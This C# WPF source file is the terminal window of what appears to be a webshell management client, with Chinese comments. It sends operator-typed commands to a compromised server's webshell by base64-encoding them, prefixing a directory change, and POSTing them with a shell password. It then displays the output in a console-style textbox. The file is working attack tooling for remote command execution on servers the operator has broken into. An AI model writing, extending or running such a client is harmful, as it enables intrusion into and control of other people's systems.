using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using WpfApp1.Payload.aspx;
using WpfApp1.Utli;

namespace WpfApp1.UI.aspx
{
    /// <summary>
    /// ATrminals.xaml 的交互逻辑
    /// </summary>
    public partial class ATrminals : Window
    {
        public ATrminals()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 引入post 请求类
        /// </summary>
        Post Post = new Post();




        /// <summary>
        /// 引入payload
        /// </summary>
        Base Base = new Base();
        /// <summary>
        /// 引入base64
        /// </summary>
        encrypt encrypt = new encrypt();


        private int i = 0;
        private int j = 0;
        private int m = 0;
        private int n = 0;


        private List<string> CmdList = new List<string>();

        private List<string> rootlist = new List<string>();

        string wroot = string.Empty;



        /// <summary>
        /// url
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// 密码
        /// </summary>
        public string getPwd { get; set; }

        /// <summary>
        /// url
        /// </summary>
        string urls = string.Empty;
        /// <summary>
        /// 密码
        /// </summary>
        string Password = string.Empty;

        public string Cmd;

        /// <summary>
        /// 初始化
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                Wroot(); //获取当前目录
                var a = MyTextBox.Text;
                if (a == "")
                {
                    //获取webshell当前目录
                    foreach (var root in rootlist)
                    {
                        wroot = root;

                    }

                    this.MyTextBox.Text = wroot + ">";

                }
                else
                {
                    if (this.MyTextBox.Text.EndsWith(">"))
                    {
                        return;
                    }
                    else if (this.MyTextBox.Text.EndsWith("\n"))
                    {
                        this.MyTextBox.Text += "\n\r>";
                    }
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
           
        }

        /// <summary>
        /// 获取webshell当前目录
        /// </summary>
        /// <returns></returns>
        public void Wroot()
        {

            urls = getUrl;
            Password = getPwd;

            string p = Base.info();
     
            string rsults = Post.Postring(urls, new Dictionary<string, string> { { Password, p } });
            //MessageBox.Show(rsults);

            if (rsults == "webshell连接超时")
            {

                this.Close();
                MessageBox.Show("链接超时或者网络原因！");
            }
            string[] xz = rsults.Split("\t");

            rootlist.Add(xz[0]);


        }

        /// <summary>
        /// 请求获取数据
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        public string Result(string cmd)
        {
            string rsults = string.Empty;
            try
            {
                string Cmds = Base.cmd();
                string z1 = string.Format("cd /d \"{0}\"&{1}&echo",wroot,cmd);
                string base64Z1 = encrypt.EncodeBase64("utf-8",z1);
                string s = Cmds + "&bin=Y21k&cmd="+base64Z1+"&env=Ts";
                rsults = Post.Postring(urls, new Dictionary<string, string> { { Password, s } });

                if (rsults == "webshell连接超时")
                {

                    this.Close();
                    MessageBox.Show("链接超时或者网络原因！");
                }

            }
            catch
            {
                MessageBox.Show("Error");
            }


            return rsults.Replace("|<-","").Replace("->|", "");

        }


        private void MyTextBox_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {


            //Enter 回车
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Enter))
            {
                e.Handled = true;
                var a = MyTextBox.Text;
                Cmd = a.Substring(a.LastIndexOf(">") + 1, MyTextBox.Text.Length - a.LastIndexOf(">") - 1);
                if (a.EndsWith(">" + Cmd))
                {
                    //判断cd 切换目录命令
                    if (Cmd.Contains("cd"))
                    {
                        string[] parts = Cmd.Split(' '); // 使用空格分割字符串
                        if (parts.Length > 1)
                        {
                            wroot = parts[1]; // 获取第二个元素

                        }
                        this.MyTextBox.Text = wroot + ">";
                    }
                    else
                    {
                        string txt = Result(Cmd);
                        MyTextBox.Text += "\n" + txt + "\n" + wroot + ">";
                        CmdList.Add(txt);
                        MyTextBox.SelectionStart = MyTextBox.Text.Length + 1;
                    }
                

                }

                if (a.EndsWith(">cls"))
                {
                    this.MyTextBox.Text = wroot + ">";
                    CmdList.Clear();
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                }

            }

            //Backespace <-  删除
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Back))
            {
                e.Handled = true;
                var a = MyTextBox.Text;
                if (a.EndsWith(">"))
                {
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    var NewChar = new char[charArray.Length - 1];
                    if (charArray.Length > 0)
                    {
                        Array.Copy(charArray, 0, NewChar, 0, charArray.Length - 1);
                        string s = new string(NewChar);
                        MyTextBox.Text = a.Remove(a.LastIndexOf(">")) + ">" + s;
                        MyTextBox.SelectionStart = MyTextBox.Text.Length;

                    }
                    else
                    {
                        return;
                    }
                }
            }

            //Left
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Left))
            {
                i++;
                e.Handled = true;
                var a = MyTextBox.Text;
                if (a.EndsWith(">"))
                {
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    if (i <= charArray.Length)
                    {
                        MyTextBox.SelectionStart = MyTextBox.Text.Length - i;
                        j = charArray.Length - i;
                        return;
                    }
                }

            }

            //Right
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Right))
            {
                j++;
                e.Handled = true;
                var a = MyTextBox.Text;
                if (a.EndsWith(">"))
                {
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    if (j <= charArray.Length)
                    {
                        MyTextBox.SelectionStart = MyTextBox.Text.Length + j;
                        i = charArray.Length - j;
                        return;
                    }
                }

            }

            //Up
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Up))
            {
                m++;
                e.Handled = true;
                var a = MyTextBox.Text;
                if (a.EndsWith(">"))
                {
                    if (CmdList.Count > 0 && (m - 1 < CmdList.Count))
                    {
                        MyTextBox.Text += CmdList[CmdList.Count - m];
                        n = CmdList.Count - m;
                    }
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                }
                else
                {
                    MyTextBox.Text = a.Remove(a.LastIndexOf(">")) + ">";
                    if (CmdList.Count > 0 && (m - 1 < CmdList.Count))
                    {
                        MyTextBox.Text += CmdList[CmdList.Count - m];
                        n = CmdList.Count - m;
                    }
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                }
            }

            //Dowm
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Down))
            {
                n++;
                e.Handled = true;
                var a = MyTextBox.Text;
                if (a.EndsWith(">"))
                {
                    if (CmdList.Count > 0 && (n - 1 < CmdList.Count))
                    {
                        MyTextBox.Text += CmdList[CmdList.Count - n];
                        m = CmdList.Count - n;
                    }
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                }
                else
                {
                    MyTextBox.Text = a.Remove(a.LastIndexOf(">")) + ">";
                    if (CmdList.Count > 0 && (n - 1 < CmdList.Count))
                    {
                        MyTextBox.Text += CmdList[CmdList.Count - n];
                        m = CmdList.Count - n;
                    }
                    MyTextBox.SelectionStart = MyTextBox.Text.Length;
                }
            }



        }

       
    }
}
